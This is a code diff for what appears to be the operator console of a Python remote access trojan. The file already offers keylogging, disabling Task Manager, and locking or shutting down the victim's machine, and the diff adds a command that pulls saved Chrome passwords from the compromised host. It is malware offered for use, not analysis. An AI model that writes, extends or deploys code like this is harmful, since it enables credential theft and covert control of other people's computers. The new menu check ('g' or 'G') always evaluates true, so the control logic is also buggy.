@@ -1,4 +1,4 @@
-import socket, os, time, threading, sys, json
+import socket, os, time, threading, sys,json
 from queue import Queue
 from cryptography.fernet import Fernet
 
@@ -65,7 +65,6 @@ def socket_bind():
     except socket.error() as strError:
         print(f"Error binding socket {strError} Retrying...")
         socket_bind()
-
 
 def socket_accept():
     while True:
@@ -375,10 +374,16 @@ def python_interpreter():
     recv(intBuff)
 
 
+
 def disable_taskmgr():
     send(b"dtaskmgr")
     print(recv(intBuff).decode())  # print response
 
+def getchromepass():
+    send(b'getchromepass')
+    while True:
+        print(recv(intBuff).decode())
+    
 
 def keylogger(option):
     if option == "start":
@@ -436,6 +441,7 @@ def show_help():
     print("X (1) Lock user")
     print("X (2) Restart user")
     print("X (3) Shutdown user")
+    print('G Get Chrome password')
     print("B Move connection to background")
     print("C Close connection")
 
@@ -474,6 +480,8 @@ def send_commands():
                 receive()
             elif strChoice == "x 1":
                 send(b"lock")
+            elif strChoice == 'g' or 'G':
+                getchromepass()
             elif strChoice == "x 2":
                 send(b"shutdown")
                 conn.close()
